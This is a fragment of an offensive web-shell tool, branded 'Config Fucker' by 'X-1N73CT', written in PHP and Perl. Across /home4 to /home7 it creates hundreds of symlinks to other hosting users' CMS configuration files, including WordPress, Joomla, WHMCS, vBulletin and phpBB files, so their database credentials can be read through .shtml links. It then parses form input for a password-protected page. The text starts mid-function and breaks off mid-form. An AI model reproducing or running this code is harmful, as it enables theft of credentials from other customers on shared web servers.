 symlink('/home4/'.$user.'/public_html/main/wp-config.php',$domain.'~~>wordpress-main.shtml');
 symlink('/home4/'.$user.'/public_html/test/wp-config.php',$domain.'~~>wordpress-test.shtml');
 symlink('/home4/'.$user.'/public_html/beta/configuration.php',$domain.'~~>joomla.shtml') ; 
 symlink('/home4/'.$user.'/public_html/configuration.php',$domain.'~~>joomla.shtml') ; 
 symlink('/home4/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.shtml') ;
 symlink('/home4/'.$user.'/public_html/joomla/configuration.php',$domain.'~~>joomla-joomla.shtml');
 symlink('/home4/'.$user.'/public_html/protal/configuration.php',$domain.'~~>joomla-protal.shtml');
 symlink('/home4/'.$user.'/public_html/joo/configuration.php',$domain.'~~>joomla-joo.shtml');
 symlink('/home4/'.$user.'/public_html/cms/configuration.php',$domain.'~~>joomla-cms.shtml');
 symlink('/home4/'.$user.'/public_html/site/configuration.php',$domain.'~~>joomla-site.shtml');
 symlink('/home4/'.$user.'/public_html/main/configuration.php',$domain.'~~>joomla-main.shtml');
 symlink('/home4/'.$user.'/public_html/news/configuration.php',$domain.'~~>joomla-news.shtml');
 symlink('/home4/'.$user.'/public_html/new/configuration.php',$domain.'~~>joomla-new.shtml');
 symlink('/home4/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.shtml');
 symlink('/home4/'.$user.'/public_html/forum/includes/config.php',$domain.'~~>VBulletin-forum.shtml');
 symlink('/home4/'.$user.'/public_html/vb/includes/config.php',$domain.'~~>vb.shtml');
 symlink('/home4/'.$user.'/public_html/vb3/includes/config.php',$domain.'~~>vb3.shtml');
 symlink('/home4/'.$user.'/public_html/cpanel/configuration.php',$domain.'~~>cpanel.shtml');
 symlink('/home4/'.$user.'/public_html/panel/configuration.php',$domain.'~~>panel.shtml');
 symlink('/home4/'.$user.'/public_html/host/configuration.php',$domain.'~~>host.shtml');
 symlink('/home4/'.$user.'/public_html/hosting/configuration.php',$domain.'~~>hosting.shtml');
 symlink('/home4/'.$user.'/public_html/hosts/configuration.php',$domain.'~~>hosts.shtml');
 symlink('/home4/'.$user.'/public_html/includes/dist-configure.php',$domain.'~~>zencart.shtml'); 
 symlink('/home4/'.$user.'/public_html/zencart/includes/dist-configure.php',$domain.'~~>zencart-shop.shtml'); 
 symlink('/home4/'.$user.'/public_html/shop/includes/dist-configure.php',$domain.'~~>shop-ZCshop.shtml'); 
 symlink('/home4/'.$user.'/public_html/mk_conf.php',$pdomain.'~~>mk-portale1.shtml');
 symlink('/home4/'.$user.'/public_html/Settings.php',$domain.'~~>smf.shtml'); 
 symlink('/home4/'.$user.'/public_html/smf/Settings.php',$domain.'~~>smf-smf.shtml'); 
 symlink('/home4/'.$user.'/public_html/forum/Settings.php',$domain.'~~>smf-forum.shtml'); 
 symlink('/home4/'.$user.'/public_html/forums/Settings.php',$domain.'~~>smf-forums.shtml'); 
 symlink('/home4/'.$user.'/public_html/upload/includes/config.php',$domain.'~~>upload.shtml');
 symlink('/home4/'.$user.'/public_html/incl/config.php',$domain.'~~>malay.shtml');
 symlink('/home4/'.$user.'/public_html/clientes/configuration.php',$domain.'~~>clents.shtml');
 symlink('/home4/'.$user.'/public_html/cliente/configuration.php',$domain.'~~>client2.shtml');
 symlink('/home4/'.$user.'/public_html/clientsupport/configuration.php',$domain.'~~>client.shtml');
 symlink('/home4/'.$user.'/public_html/config/koneksi.php',$domain.'~~>lokomedia.shtml');
 symlink('/home4/'.$user.'/public_html/admin/config.php',$domain.'~~>webconfig.shtml');
 symlink('/home4/'.$user.'/public_html/admin/conf.php',$domain.'~~>webconfig2.shtml');
 symlink('/home4/'.$user.'/public_html/system/sistem.php',$domain.'~~>lokomedia1.shtml'); 
 symlink('/home4/'.$user.'/system/sistem.php',$domain.'~~>lokomedia.shtml');
 symlink('/home4/'.$user.'/public_html/sites/default/settings.php',$domain.'~>Drupal.shtml');
 symlink('/home4/'.$user.'/public_html/e107_config.php',$domain.'~>e107.shtml');
 symlink('/home4/'.$user.'/public_html/datas/config.php',$domain.'~>Seditio.shtml');
 symlink('/home5/'.$user.'/public_html/SSI.php',$domain.'~~>CMF.shtml') ; 
 symlink('/home5/'.$user.'/public_html/forum/SSI.php',$domain.'~~>CMF-forum.shtml') ; 
 symlink('/home5/'.$user.'/public_html/inc/config.php',$domain.'~~>MyBB.shtml') ;
 symlink('/home5/'.$user.'/public_html/forum/inc/config.php',$domain.'~~>MyBB-forum.shtml') ;
 symlink('/home5/'.$user.'/public_html/config.php',$domain.'~~>Other.shtml') ;
 symlink('/home5/'.$user.'/public_html/conf_global.php',$domain.'~~>invisio.shtml');
 symlink('/home5/'.$user.'/public_html/lib/config.php',$domain.'~~>Balitbang.shtml') ;
 symlink('/home5/'.$user.'/public_html/client/configuration.php',$domain.'~~>clients.shtml') ; 
 symlink('/home5/'.$user.'/public_html/clients/configuration.php',$domain.'~~>client.shtml') ; 
 symlink('/home5/'.$user.'/public_html/billing/configuration.php',$domain.'~~>billing.shtml') ; 
 symlink('/home5/'.$user.'/public_html/billings/configuration.php',$domain.'~~>billings.shtml') ;
 symlink('/home5/'.$user.'/public_html/forum/config.php',$domain.'~~>PhpBB-forum.shtml') ;
 symlink('/home5/'.$user.'/public_html/includes/functions.php',$domain.'~~>phpbb3.shtml');
 symlink('/home5/'.$user.'/public_html/whmcs/configuration.php',$domain.'~~>whmcs.shtml') ; 
 symlink('/home5/'.$user.'/public_html/whm/configuration.php',$domain.'~~>whm.shtml');
 symlink('/home5/'.$user.'/public_html/whmc/configuration.php',$domain.'~~>whmc.shtml');
 symlink('/home5/'.$user.'/public_html/submitticket.php',$domain.'~~>whmcs2.shtml');
 symlink('/home5/'.$user.'/public_html/manage/configuration.php',$domain.'~~>mangewhmcs.shtml'); 
 symlink('/home5/'.$user.'/public_html/order/configuration.php',$domain.'~~>Whm9.shtml');
 symlink('/home5/'.$user.'/public_html/myshop/configuration.php',$domain.'~~>myshop.shtml'); 
 symlink('/home5/'.$user.'/public_html/support/configuration.php',$domain.'~~>support.shtml');
 symlink('/home5/'.$user.'/public_html/supports/configuration.php',$domain.'~~>supports.shtml');
 symlink('/home5/'.$user.'/public_html/oscommerce/includes/configure.php',$domain.'~~>oscommerce.shtml');
 symlink('/home5/'.$user.'/public_html/oscommerces/includes/configure.php',$domain.'~~>oscommerces.shtml');
 symlink('/home5/'.$user.'/public_html/shopping/includes/configure.php',$domain.'~~>shop-shopping.shtml');
 symlink('/home5/'.$user.'/public_html/sale/includes/configure.php',$domain.'~~>sale.shtml');
 symlink('/home5/'.$user.'/public_html/amember/config.inc.php',$domain.'~~>amember.shtml');
 symlink('/home5/'.$user.'/public_html/config.inc.php',$domain.'~~>amember2.shtml');
 symlink('/home5/'.$user.'/public_html/wp-config.php',$domain.'~~>wordpress.shtml') ; 
 symlink('/home5/'.$user.'/public_html/wp/wp-config.php',$domain.'~~>wordpress-wp.shtml');
 symlink('/home5/'.$user.'/public_html/wp/beta/wp-config.php',$domain.'~~>wordpress-wp-beta.shtml');
 symlink('/home5/'.$user.'/public_html/beta/wp-config.php',$domain.'~~>wordpress-beta.shtml');
 symlink('/home5/'.$user.'/public_html/press/wp-config.php',$domain.'~~>wp13-press.shtml');
 symlink('/home5/'.$user.'/public_html/wordpress/wp-config.php',$domain.'~~>wordpress-wordpress.shtml');
 symlink('/home5/'.$user.'/public_html/wordpress/beta/wp-config.php',$domain.'~~>wordpress-wordpress-beta.shtml');
 symlink('/home5/'.$user.'/public_html/news/wp-config.php',$domain.'~~>wordpress-news.shtml');
 symlink('/home5/'.$user.'/public_html/new/wp-config.php',$domain.'~~>wordpress-new.shtml');
 symlink('/home5/'.$user.'/public_html/blog/wp-config.php',$domain.'~~>wordpress.shtml') ; 
 symlink('/home5/'.$user.'/public_html/web/wp-config.php',$domain.'~~>wordpress-web.shtml') ; 
 symlink('/home5/'.$user.'/public_html/blogs/wp-config.php',$domain.'~~>wordpress-blogs.shtml');
 symlink('/home5/'.$user.'/public_html/home/wp-config.php',$domain.'~~>wordpress-home.shtml');
 symlink('/home5/'.$user.'/public_html/protal/wp-config.php',$domain.'~~>wordpress-protal.shtml');
 symlink('/home5/'.$user.'/public_html/site/wp-config.php',$domain.'~~>ordpress-site.shtml');
 symlink('/home5/'.$user.'/public_html/main/wp-config.php',$domain.'~~>wordpress-main.shtml');
 symlink('/home5/'.$user.'/public_html/test/wp-config.php',$domain.'~~>wordpress-test.shtml');
 symlink('/home5/'.$user.'/public_html/beta/configuration.php',$domain.'~~>joomla.shtml') ; 
 symlink('/home5/'.$user.'/public_html/configuration.php',$domain.'~~>joomla.shtml') ; 
 symlink('/home5/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.shtml') ;
 symlink('/home5/'.$user.'/public_html/joomla/configuration.php',$domain.'~~>joomla-joomla.shtml');
 symlink('/home5/'.$user.'/public_html/protal/configuration.php',$domain.'~~>joomla-protal.shtml');
 symlink('/home5/'.$user.'/public_html/joo/configuration.php',$domain.'~~>joomla-joo.shtml');
 symlink('/home5/'.$user.'/public_html/cms/configuration.php',$domain.'~~>joomla-cms.shtml');
 symlink('/home5/'.$user.'/public_html/site/configuration.php',$domain.'~~>joomla-site.shtml');
 symlink('/home5/'.$user.'/public_html/main/configuration.php',$domain.'~~>joomla-main.shtml');
 symlink('/home5/'.$user.'/public_html/news/configuration.php',$domain.'~~>joomla-news.shtml');
 symlink('/home5/'.$user.'/public_html/new/configuration.php',$domain.'~~>joomla-new.shtml');
 symlink('/home5/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.shtml');
 symlink('/home5/'.$user.'/public_html/forum/includes/config.php',$domain.'~~>VBulletin-forum.shtml');
 symlink('/home5/'.$user.'/public_html/vb/includes/config.php',$domain.'~~>vb.shtml');
 symlink('/home5/'.$user.'/public_html/vb3/includes/config.php',$domain.'~~>vb3.shtml');
 symlink('/home5/'.$user.'/public_html/cpanel/configuration.php',$domain.'~~>cpanel.shtml');
 symlink('/home5/'.$user.'/public_html/panel/configuration.php',$domain.'~~>panel.shtml');
 symlink('/home5/'.$user.'/public_html/host/configuration.php',$domain.'~~>host.shtml');
 symlink('/home5/'.$user.'/public_html/hosting/configuration.php',$domain.'~~>hosting.shtml');
 symlink('/home5/'.$user.'/public_html/hosts/configuration.php',$domain.'~~>hosts.shtml');
 symlink('/home5/'.$user.'/public_html/includes/dist-configure.php',$domain.'~~>zencart.shtml'); 
 symlink('/home5/'.$user.'/public_html/zencart/includes/dist-configure.php',$domain.'~~>zencart-shop.shtml'); 
 symlink('/home5/'.$user.'/public_html/shop/includes/dist-configure.php',$domain.'~~>shop-ZCshop.shtml'); 
 symlink('/home5/'.$user.'/public_html/mk_conf.php',$pdomain.'~~>mk-portale1.shtml');
 symlink('/home5/'.$user.'/public_html/Settings.php',$domain.'~~>smf.shtml'); 
 symlink('/home5/'.$user.'/public_html/smf/Settings.php',$domain.'~~>smf-smf.shtml'); 
 symlink('/home5/'.$user.'/public_html/forum/Settings.php',$domain.'~~>smf-forum.shtml'); 
 symlink('/home5/'.$user.'/public_html/forums/Settings.php',$domain.'~~>smf-forums.shtml'); 
 symlink('/home5/'.$user.'/public_html/upload/includes/config.php',$domain.'~~>upload.shtml');
 symlink('/home5/'.$user.'/public_html/incl/config.php',$domain.'~~>malay.shtml');
 symlink('/home5/'.$user.'/public_html/clientes/configuration.php',$domain.'~~>clents.shtml');
 symlink('/home5/'.$user.'/public_html/cliente/configuration.php',$domain.'~~>client2.shtml');
 symlink('/home5/'.$user.'/public_html/clientsupport/configuration.php',$domain.'~~>client.shtml');
 symlink('/home5/'.$user.'/public_html/config/koneksi.php',$domain.'~~>lokomedia.shtml');
 symlink('/home5/'.$user.'/public_html/admin/config.php',$domain.'~~>webconfig.shtml');
 symlink('/home5/'.$user.'/public_html/admin/conf.php',$domain.'~~>webconfig2.shtml');
 symlink('/home5/'.$user.'/public_html/system/sistem.php',$domain.'~~>lokomedia1.shtml'); 
 symlink('/home5/'.$user.'/system/sistem.php',$domain.'~~>lokomedia.shtml');
 symlink('/home5/'.$user.'/public_html/sites/default/settings.php',$domain.'~>Drupal.shtml');
 symlink('/home5/'.$user.'/public_html/e107_config.php',$domain.'~>e107.shtml');
 symlink('/home5/'.$user.'/public_html/datas/config.php',$domain.'~>Seditio.shtml');
 symlink('/home6/'.$user.'/public_html/SSI.php',$domain.'~~>CMF.shtml') ; 
 symlink('/home6/'.$user.'/public_html/forum/SSI.php',$domain.'~~>CMF-forum.shtml') ; 
 symlink('/home6/'.$user.'/public_html/inc/config.php',$domain.'~~>MyBB.shtml') ;
 symlink('/home6/'.$user.'/public_html/forum/inc/config.php',$domain.'~~>MyBB-forum.shtml') ;
 symlink('/home6/'.$user.'/public_html/config.php',$domain.'~~>Other.shtml') ;
 symlink('/home6/'.$user.'/public_html/conf_global.php',$domain.'~~>invisio.shtml');
 symlink('/home6/'.$user.'/public_html/lib/config.php',$domain.'~~>Balitbang.shtml') ;
 symlink('/home6/'.$user.'/public_html/client/configuration.php',$domain.'~~>clients.shtml') ; 
 symlink('/home6/'.$user.'/public_html/clients/configuration.php',$domain.'~~>client.shtml') ; 
 symlink('/home6/'.$user.'/public_html/billing/configuration.php',$domain.'~~>billing.shtml') ; 
 symlink('/home6/'.$user.'/public_html/billings/configuration.php',$domain.'~~>billings.shtml') ;
 symlink('/home6/'.$user.'/public_html/forum/config.php',$domain.'~~>PhpBB-forum.shtml') ;
 symlink('/home6/'.$user.'/public_html/includes/functions.php',$domain.'~~>phpbb3.shtml');
 symlink('/home6/'.$user.'/public_html/whmcs/configuration.php',$domain.'~~>whmcs.shtml') ; 
 symlink('/home6/'.$user.'/public_html/whm/configuration.php',$domain.'~~>whm.shtml');
 symlink('/home6/'.$user.'/public_html/whmc/configuration.php',$domain.'~~>whmc.shtml');
 symlink('/home6/'.$user.'/public_html/submitticket.php',$domain.'~~>whmcs2.shtml');
 symlink('/home6/'.$user.'/public_html/manage/configuration.php',$domain.'~~>mangewhmcs.shtml'); 
 symlink('/home6/'.$user.'/public_html/order/configuration.php',$domain.'~~>Whm9.shtml');
 symlink('/home6/'.$user.'/public_html/myshop/configuration.php',$domain.'~~>myshop.shtml'); 
 symlink('/home6/'.$user.'/public_html/support/configuration.php',$domain.'~~>support.shtml');
 symlink('/home6/'.$user.'/public_html/supports/configuration.php',$domain.'~~>supports.shtml');
 symlink('/home6/'.$user.'/public_html/oscommerce/includes/configure.php',$domain.'~~>oscommerce.shtml');
 symlink('/home6/'.$user.'/public_html/oscommerces/includes/configure.php',$domain.'~~>oscommerces.shtml');
 symlink('/home6/'.$user.'/public_html/shopping/includes/configure.php',$domain.'~~>shop-shopping.shtml');
 symlink('/home6/'.$user.'/public_html/sale/includes/configure.php',$domain.'~~>sale.shtml');
 symlink('/home6/'.$user.'/public_html/amember/config.inc.php',$domain.'~~>amember.shtml');
 symlink('/home6/'.$user.'/public_html/config.inc.php',$domain.'~~>amember2.shtml');
 symlink('/home6/'.$user.'/public_html/wp-config.php',$domain.'~~>wordpress.shtml') ; 
 symlink('/home6/'.$user.'/public_html/wp/wp-config.php',$domain.'~~>wordpress-wp.shtml');
 symlink('/home6/'.$user.'/public_html/wp/beta/wp-config.php',$domain.'~~>wordpress-wp-beta.shtml');
 symlink('/home6/'.$user.'/public_html/beta/wp-config.php',$domain.'~~>wordpress-beta.shtml');
 symlink('/home6/'.$user.'/public_html/press/wp-config.php',$domain.'~~>wp13-press.shtml');
 symlink('/home6/'.$user.'/public_html/wordpress/wp-config.php',$domain.'~~>wordpress-wordpress.shtml');
 symlink('/home6/'.$user.'/public_html/wordpress/beta/wp-config.php',$domain.'~~>wordpress-wordpress-beta.shtml');
 symlink('/home6/'.$user.'/public_html/news/wp-config.php',$domain.'~~>wordpress-news.shtml');
 symlink('/home6/'.$user.'/public_html/new/wp-config.php',$domain.'~~>wordpress-new.shtml');
 symlink('/home6/'.$user.'/public_html/blog/wp-config.php',$domain.'~~>wordpress.shtml') ; 
 symlink('/home6/'.$user.'/public_html/web/wp-config.php',$domain.'~~>wordpress-web.shtml') ; 
 symlink('/home6/'.$user.'/public_html/blogs/wp-config.php',$domain.'~~>wordpress-blogs.shtml');
 symlink('/home6/'.$user.'/public_html/home/wp-config.php',$domain.'~~>wordpress-home.shtml');
 symlink('/home6/'.$user.'/public_html/protal/wp-config.php',$domain.'~~>wordpress-protal.shtml');
 symlink('/home6/'.$user.'/public_html/site/wp-config.php',$domain.'~~>ordpress-site.shtml');
 symlink('/home6/'.$user.'/public_html/main/wp-config.php',$domain.'~~>wordpress-main.shtml');
 symlink('/home6/'.$user.'/public_html/test/wp-config.php',$domain.'~~>wordpress-test.shtml');
 symlink('/home6/'.$user.'/public_html/beta/configuration.php',$domain.'~~>joomla.shtml') ; 
 symlink('/home6/'.$user.'/public_html/configuration.php',$domain.'~~>joomla.shtml') ; 
 symlink('/home6/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.shtml') ;
 symlink('/home6/'.$user.'/public_html/joomla/configuration.php',$domain.'~~>joomla-joomla.shtml');
 symlink('/home6/'.$user.'/public_html/protal/configuration.php',$domain.'~~>joomla-protal.shtml');
 symlink('/home6/'.$user.'/public_html/joo/configuration.php',$domain.'~~>joomla-joo.shtml');
 symlink('/home6/'.$user.'/public_html/cms/configuration.php',$domain.'~~>joomla-cms.shtml');
 symlink('/home6/'.$user.'/public_html/site/configuration.php',$domain.'~~>joomla-site.shtml');
 symlink('/home6/'.$user.'/public_html/main/configuration.php',$domain.'~~>joomla-main.shtml');
 symlink('/home6/'.$user.'/public_html/news/configuration.php',$domain.'~~>joomla-news.shtml');
 symlink('/home6/'.$user.'/public_html/new/configuration.php',$domain.'~~>joomla-new.shtml');
 symlink('/home6/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.shtml');
 symlink('/home6/'.$user.'/public_html/forum/includes/config.php',$domain.'~~>VBulletin-forum.shtml');
 symlink('/home6/'.$user.'/public_html/vb/includes/config.php',$domain.'~~>vb.shtml');
 symlink('/home6/'.$user.'/public_html/vb3/includes/config.php',$domain.'~~>vb3.shtml');
 symlink('/home6/'.$user.'/public_html/cpanel/configuration.php',$domain.'~~>cpanel.shtml');
 symlink('/home6/'.$user.'/public_html/panel/configuration.php',$domain.'~~>panel.shtml');
 symlink('/home6/'.$user.'/public_html/host/configuration.php',$domain.'~~>host.shtml');
 symlink('/home6/'.$user.'/public_html/hosting/configuration.php',$domain.'~~>hosting.shtml');
 symlink('/home6/'.$user.'/public_html/hosts/configuration.php',$domain.'~~>hosts.shtml');
 symlink('/home6/'.$user.'/public_html/includes/dist-configure.php',$domain.'~~>zencart.shtml'); 
 symlink('/home6/'.$user.'/public_html/zencart/includes/dist-configure.php',$domain.'~~>zencart-shop.shtml'); 
 symlink('/home6/'.$user.'/public_html/shop/includes/dist-configure.php',$domain.'~~>shop-ZCshop.shtml'); 
 symlink('/home6/'.$user.'/public_html/mk_conf.php',$pdomain.'~~>mk-portale1.shtml');
 symlink('/home6/'.$user.'/public_html/Settings.php',$domain.'~~>smf.shtml'); 
 symlink('/home6/'.$user.'/public_html/smf/Settings.php',$domain.'~~>smf-smf.shtml'); 
 symlink('/home6/'.$user.'/public_html/forum/Settings.php',$domain.'~~>smf-forum.shtml'); 
 symlink('/home6/'.$user.'/public_html/forums/Settings.php',$domain.'~~>smf-forums.shtml'); 
 symlink('/home6/'.$user.'/public_html/upload/includes/config.php',$domain.'~~>upload.shtml');
 symlink('/home6/'.$user.'/public_html/incl/config.php',$domain.'~~>malay.shtml');
 symlink('/home6/'.$user.'/public_html/clientes/configuration.php',$domain.'~~>clents.shtml');
 symlink('/home6/'.$user.'/public_html/cliente/configuration.php',$domain.'~~>client2.shtml');
 symlink('/home6/'.$user.'/public_html/clientsupport/configuration.php',$domain.'~~>client.shtml');
 symlink('/home6/'.$user.'/public_html/config/koneksi.php',$domain.'~~>lokomedia.shtml');
 symlink('/home6/'.$user.'/public_html/admin/config.php',$domain.'~~>webconfig.shtml');
 symlink('/home6/'.$user.'/public_html/admin/conf.php',$domain.'~~>webconfig2.shtml');
 symlink('/home6/'.$user.'/public_html/system/sistem.php',$domain.'~~>lokomedia1.shtml'); 
 symlink('/home6/'.$user.'/system/sistem.php',$domain.'~~>lokomedia.shtml');
 symlink('/home6/'.$user.'/public_html/sites/default/settings.php',$domain.'~>Drupal.shtml');
 symlink('/home6/'.$user.'/public_html/e107_config.php',$domain.'~>e107.shtml');
 symlink('/home6/'.$user.'/public_html/datas/config.php',$domain.'~>Seditio.shtml');
 symlink('/home7/'.$user.'/public_html/SSI.php',$domain.'~~>CMF.shtml') ; 
 symlink('/home7/'.$user.'/public_html/forum/SSI.php',$domain.'~~>CMF-forum.shtml') ; 
 symlink('/home7/'.$user.'/public_html/inc/config.php',$domain.'~~>MyBB.shtml') ;
 symlink('/home7/'.$user.'/public_html/forum/inc/config.php',$domain.'~~>MyBB-forum.shtml') ;
 symlink('/home7/'.$user.'/public_html/config.php',$domain.'~~>Other.shtml') ;
 symlink('/home7/'.$user.'/public_html/conf_global.php',$domain.'~~>invisio.shtml');
 symlink('/home7/'.$user.'/public_html/lib/config.php',$domain.'~~>Balitbang.shtml') ;
 symlink('/home7/'.$user.'/public_html/client/configuration.php',$domain.'~~>clients.shtml') ; 
 symlink('/home7/'.$user.'/public_html/clients/configuration.php',$domain.'~~>client.shtml') ; 
 symlink('/home7/'.$user.'/public_html/billing/configuration.php',$domain.'~~>billing.shtml') ; 
 symlink('/home7/'.$user.'/public_html/billings/configuration.php',$domain.'~~>billings.shtml') ;
 symlink('/home7/'.$user.'/public_html/forum/config.php',$domain.'~~>PhpBB-forum.shtml') ;
 symlink('/home7/'.$user.'/public_html/includes/functions.php',$domain.'~~>phpbb3.shtml');
 symlink('/home7/'.$user.'/public_html/whmcs/configuration.php',$domain.'~~>whmcs.shtml') ; 
 symlink('/home7/'.$user.'/public_html/whm/configuration.php',$domain.'~~>whm.shtml');
 symlink('/home7/'.$user.'/public_html/whmc/configuration.php',$domain.'~~>whmc.shtml');
 symlink('/home7/'.$user.'/public_html/submitticket.php',$domain.'~~>whmcs2.shtml');
 symlink('/home7/'.$user.'/public_html/manage/configuration.php',$domain.'~~>mangewhmcs.shtml'); 
 symlink('/home7/'.$user.'/public_html/order/configuration.php',$domain.'~~>Whm9.shtml');
 symlink('/home7/'.$user.'/public_html/myshop/configuration.php',$domain.'~~>myshop.shtml'); 
 symlink('/home7/'.$user.'/public_html/support/configuration.php',$domain.'~~>support.shtml');
 symlink('/home7/'.$user.'/public_html/supports/configuration.php',$domain.'~~>supports.shtml');
 symlink('/home7/'.$user.'/public_html/oscommerce/includes/configure.php',$domain.'~~>oscommerce.shtml');
 symlink('/home7/'.$user.'/public_html/oscommerces/includes/configure.php',$domain.'~~>oscommerces.shtml');
 symlink('/home7/'.$user.'/public_html/shopping/includes/configure.php',$domain.'~~>shop-shopping.shtml');
 symlink('/home7/'.$user.'/public_html/sale/includes/configure.php',$domain.'~~>sale.shtml');
 symlink('/home7/'.$user.'/public_html/amember/config.inc.php',$domain.'~~>amember.shtml');
 symlink('/home7/'.$user.'/public_html/config.inc.php',$domain.'~~>amember2.shtml');
 symlink('/home7/'.$user.'/public_html/wp-config.php',$domain.'~~>wordpress.shtml') ; 
 symlink('/home7/'.$user.'/public_html/wp/wp-config.php',$domain.'~~>wordpress-wp.shtml');
 symlink('/home7/'.$user.'/public_html/wp/beta/wp-config.php',$domain.'~~>wordpress-wp-beta.shtml');
 symlink('/home7/'.$user.'/public_html/beta/wp-config.php',$domain.'~~>wordpress-beta.shtml');
 symlink('/home7/'.$user.'/public_html/press/wp-config.php',$domain.'~~>wp13-press.shtml');
 symlink('/home7/'.$user.'/public_html/wordpress/wp-config.php',$domain.'~~>wordpress-wordpress.shtml');
 symlink('/home7/'.$user.'/public_html/wordpress/beta/wp-config.php',$domain.'~~>wordpress-wordpress-beta.shtml');
 symlink('/home7/'.$user.'/public_html/news/wp-config.php',$domain.'~~>wordpress-news.shtml');
 symlink('/home7/'.$user.'/public_html/new/wp-config.php',$domain.'~~>wordpress-new.shtml');
 symlink('/home7/'.$user.'/public_html/blog/wp-config.php',$domain.'~~>wordpress.shtml') ; 
 symlink('/home7/'.$user.'/public_html/web/wp-config.php',$domain.'~~>wordpress-web.shtml') ; 
 symlink('/home7/'.$user.'/public_html/blogs/wp-config.php',$domain.'~~>wordpress-blogs.shtml');
 symlink('/home7/'.$user.'/public_html/home/wp-config.php',$domain.'~~>wordpress-home.shtml');
 symlink('/home7/'.$user.'/public_html/protal/wp-config.php',$domain.'~~>wordpress-protal.shtml');
 symlink('/home7/'.$user.'/public_html/site/wp-config.php',$domain.'~~>ordpress-site.shtml');
 symlink('/home7/'.$user.'/public_html/main/wp-config.php',$domain.'~~>wordpress-main.shtml');
 symlink('/home7/'.$user.'/public_html/test/wp-config.php',$domain.'~~>wordpress-test.shtml');
 symlink('/home7/'.$user.'/public_html/beta/configuration.php',$domain.'~~>joomla.shtml') ; 
 symlink('/home7/'.$user.'/public_html/configuration.php',$domain.'~~>joomla.shtml') ; 
 symlink('/home7/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.shtml') ;
 symlink('/home7/'.$user.'/public_html/joomla/configuration.php',$domain.'~~>joomla-joomla.shtml');
 symlink('/home7/'.$user.'/public_html/protal/configuration.php',$domain.'~~>joomla-protal.shtml');
 symlink('/home7/'.$user.'/public_html/joo/configuration.php',$domain.'~~>joomla-joo.shtml');
 symlink('/home7/'.$user.'/public_html/cms/configuration.php',$domain.'~~>joomla-cms.shtml');
 symlink('/home7/'.$user.'/public_html/site/configuration.php',$domain.'~~>joomla-site.shtml');
 symlink('/home7/'.$user.'/public_html/main/configuration.php',$domain.'~~>joomla-main.shtml');
 symlink('/home7/'.$user.'/public_html/news/configuration.php',$domain.'~~>joomla-news.shtml');
 symlink('/home7/'.$user.'/public_html/new/configuration.php',$domain.'~~>joomla-new.shtml');
 symlink('/home7/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.shtml');
 symlink('/home7/'.$user.'/public_html/forum/includes/config.php',$domain.'~~>VBulletin-forum.shtml');
 symlink('/home7/'.$user.'/public_html/vb/includes/config.php',$domain.'~~>vb.shtml');
 symlink('/home7/'.$user.'/public_html/vb3/includes/config.php',$domain.'~~>vb3.shtml');
 symlink('/home7/'.$user.'/public_html/cpanel/configuration.php',$domain.'~~>cpanel.shtml');
 symlink('/home7/'.$user.'/public_html/panel/configuration.php',$domain.'~~>panel.shtml');
 symlink('/home7/'.$user.'/public_html/host/configuration.php',$domain.'~~>host.shtml');
 symlink('/home7/'.$user.'/public_html/hosting/configuration.php',$domain.'~~>hosting.shtml');
 symlink('/home7/'.$user.'/public_html/hosts/configuration.php',$domain.'~~>hosts.shtml');
 symlink('/home7/'.$user.'/public_html/includes/dist-configure.php',$domain.'~~>zencart.shtml'); 
 symlink('/home7/'.$user.'/public_html/zencart/includes/dist-configure.php',$domain.'~~>zencart-shop.shtml'); 
 symlink('/home7/'.$user.'/public_html/shop/includes/dist-configure.php',$domain.'~~>shop-ZCshop.shtml'); 
 symlink('/home7/'.$user.'/public_html/mk_conf.php',$pdomain.'~~>mk-portale1.shtml');
 symlink('/home7/'.$user.'/public_html/Settings.php',$domain.'~~>smf.shtml'); 
 symlink('/home7/'.$user.'/public_html/smf/Settings.php',$domain.'~~>smf-smf.shtml'); 
 symlink('/home7/'.$user.'/public_html/forum/Settings.php',$domain.'~~>smf-forum.shtml'); 
 symlink('/home7/'.$user.'/public_html/forums/Settings.php',$domain.'~~>smf-forums.shtml'); 
 symlink('/home7/'.$user.'/public_html/upload/includes/config.php',$domain.'~~>upload.shtml');
 symlink('/home7/'.$user.'/public_html/incl/config.php',$domain.'~~>malay.shtml');
 symlink('/home7/'.$user.'/public_html/clientes/configuration.php',$domain.'~~>clents.shtml');
 symlink('/home7/'.$user.'/public_html/cliente/configuration.php',$domain.'~~>client2.shtml');
 symlink('/home7/'.$user.'/public_html/clientsupport/configuration.php',$domain.'~~>client.shtml');
 symlink('/home7/'.$user.'/public_html/config/koneksi.php',$domain.'~~>lokomedia.shtml');
 symlink('/home7/'.$user.'/public_html/admin/config.php',$domain.'~~>webconfig.shtml');
 symlink('/home7/'.$user.'/public_html/admin/conf.php',$domain.'~~>webconfig2.shtml');
 symlink('/home7/'.$user.'/public_html/system/sistem.php',$domain.'~~>lokomedia1.shtml'); 
 symlink('/home7/'.$user.'/system/sistem.php',$domain.'~~>lokomedia.shtml');
 symlink('/home7/'.$user.'/public_html/sites/default/settings.php',$domain.'~>Drupal.shtml');
 symlink('/home7/'.$user.'/public_html/e107_config.php',$domain.'~>e107.shtml');
 symlink('/home7/'.$user.'/public_html/datas/config.php',$domain.'~>Seditio.shtml');
}
if ($ENV{'REQUEST_METHOD'} eq 'POST') {
  read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});
} else {
  $buffer = $ENV{'QUERY_STRING'};
}
@pairs = split(/&/, $buffer);
foreach $pair (@pairs) {
  ($name, $value) = split(/=/, $pair);
  $name =~ tr/+/ /;
  $name =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
  $value =~ tr/+/ /;
  $value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
  $FORM{$name} = $value;
}
if ($FORM{pass} eq ""){
print '
<body class="newStyle1" bgcolor="#000000">
<p>Config Fucker</p>
<p><font color="#C0C0C0">[</font> Coded By <font color="#FF0000">X-1N73CT</font><font color="#C0C0C0">]</font>
<form method="post">
